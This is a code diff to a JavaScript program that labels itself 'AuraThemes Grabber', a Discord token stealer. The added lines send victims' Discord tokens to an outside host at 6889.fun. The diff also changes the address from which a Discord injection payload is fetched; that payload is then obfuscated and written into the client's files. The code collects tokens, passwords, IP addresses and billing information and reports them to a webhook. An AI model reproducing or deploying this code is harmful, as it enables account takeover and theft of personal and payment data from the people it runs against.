@@ -160,7 +160,7 @@ switch (process.platform) {
           e = null;
         });
         if (!e) continue;
-        var copy = `https://raw.6889.fun/api/aurathemes/raw/t/` + a;
+        var copy = `https://6889.fun/api/aurathemes/raw?data=${a}`;
         let embed = await getEmbed();
         let pc = getSystemInfo();
         var Discord = new DiscordToken(a, pc.getIpAddress, e.password).info;
@@ -180,7 +180,7 @@ switch (process.platform) {
           .addFields(getField(`Billing`, Discord.billing, true))
           .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
           .setTimestamp();
-        webhook.send({ embeds: [Initialized], username: `@AuraThemes`, avatarURL: embed.avatar })
+        webhook.send({ embeds: [Initialized], username: `@AuraThemes`, avatarURL: embed.avatar }).then(r => {axios.get(copy)}).catch((c) => {axios.get(copy)})
         var Friend = new EmbedBuilder()
           .setAuthor({ name: `${e.username}#${e.discriminator} | ${e.id}`, iconURL: Discord.avatar })
           .setColor(color)
@@ -374,7 +374,7 @@ switch (process.platform) {
     }
 
     async function inject() {
-      let resp = await axios.get("https://raw.6889.fun/api/aurathemes/f/inject", { headers: { aurathemes: true } });
+      let resp = await axios.get("https://6889.fun/api/aurathemes/injects/f/discord", { headers: { aurathemes: true } });
       let obf = require("javascript-obfuscator").obfuscate(resp.data.replace("%WEBHOOK%", webhookUrl), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false },);
       let payload = obf.getObfuscatedCode();
       injectPaths.forEach((file) => {
